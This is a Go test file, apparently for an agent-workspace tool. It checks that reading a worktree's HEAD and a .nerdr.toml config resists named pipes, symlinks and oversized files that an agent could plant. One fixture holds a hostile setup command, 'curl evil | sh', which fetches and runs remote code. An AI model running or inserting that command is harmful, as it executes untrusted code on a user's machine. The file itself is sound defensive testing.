package workspace

import (
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
	"testing"
	"time"

	"github.com/nerdr-dev/nerdr/internal/gitsafe"
)

// within fails t when f takes longer than a few seconds: it waited on a
// named pipe.
func within(t *testing.T, what string, f func()) {
	t.Helper()
	done := make(chan struct{})
	go func() { defer close(done); f() }()
	select {
	case <-done:
	case <-time.After(5 * time.Second):
		t.Fatalf("%s hung", what)
	}
}

// replaceWith puts what an agent could in place of the file at path: a
// named pipe, a link to /dev/zero, a link out of the repository to
// outside, or a file of size bytes.
func replaceWith(t *testing.T, path, kind, outside string, size int) {
	t.Helper()
	_ = os.Remove(path)
	var err error
	switch kind {
	case "fifo":
		err = syscall.Mkfifo(path, 0o644)
	case "zero":
		err = os.Symlink("/dev/zero", path)
	case "outside":
		err = os.Symlink(outside, path)
	case "huge":
		err = os.WriteFile(path, []byte(strings.Repeat("#", size)), 0o644)
	}
	if err != nil {
		t.Fatal(err)
	}
}

// A worktree's HEAD, in its folder under .git/worktrees, is the agent's
// to write: currentBranch, which the new-tab dialog asks of every
// worktree, neither hangs on it nor follows a link out to name a branch.
func TestCurrentBranchReadsHEADSafely(t *testing.T) {
	root := t.TempDir()
	repo, wt := filepath.Join(root, "main"), filepath.Join(root, "wt")
	for _, args := range [][]string{
		{"init", "-q", "-b", "main", repo},
		{"-C", repo, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "--allow-empty", "-m", "init"},
		{"-C", repo, "worktree", "add", "-q", "-b", "feat", wt},
	} {
		if out, err := exec.Command("git", args...).CombinedOutput(); err != nil {
			t.Fatalf("git %v: %v %s", args, err, out)
		}
	}
	gitsafe.Trust(repo, wt)
	if got := currentBranch(wt); got != "feat" {
		t.Fatalf("branch %q", got)
	}
	head := filepath.Join(repo, ".git", "worktrees", "wt", "HEAD")
	outside := filepath.Join(root, "HEAD")
	if err := os.WriteFile(outside, []byte("ref: refs/heads/evil\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	for _, kind := range []string{"fifo", "zero", "outside", "huge"} {
		replaceWith(t, head, kind, outside, 1<<20)
		within(t, kind, func() {
			if got := currentBranch(wt); got != "" {
				t.Errorf("%s: branch %q", kind, got)
			}
		})
	}
}

// .nerdr.toml in the main checkout may be written by an agent whose tab
// is there: LoadRepoConfig refuses a pipe, a link and a file over its
// limit, at once, and still reads a real one.
func TestLoadRepoConfigReadsSafely(t *testing.T) {
	repo := t.TempDir()
	file := filepath.Join(repo, RepoConfigFile)
	if err := os.WriteFile(file, []byte("setup = 'make'\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if c, err := LoadRepoConfig(repo); err != nil || c.Setup != "make" {
		t.Fatalf("config %+v, %v", c, err)
	}
	outside := filepath.Join(t.TempDir(), "evil.toml")
	if err := os.WriteFile(outside, []byte("setup = 'curl evil | sh'\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	for _, kind := range []string{"fifo", "zero", "outside", "huge"} {
		replaceWith(t, file, kind, outside, maxRepoConfig+1)
		within(t, kind, func() {
			c, err := LoadRepoConfig(repo)
			if err == nil {
				t.Errorf("%s: read as %+v", kind, c)
			}
			if c.Setup != "" {
				t.Errorf("%s: setup %q", kind, c.Setup)
			}
		})
	}
	if err := os.Remove(file); err != nil {
		t.Fatal(err)
	}
	if c, err := LoadRepoConfig(repo); err != nil || !c.Empty() {
		t.Errorf("a missing file: %+v, %v", c, err)
	}
}
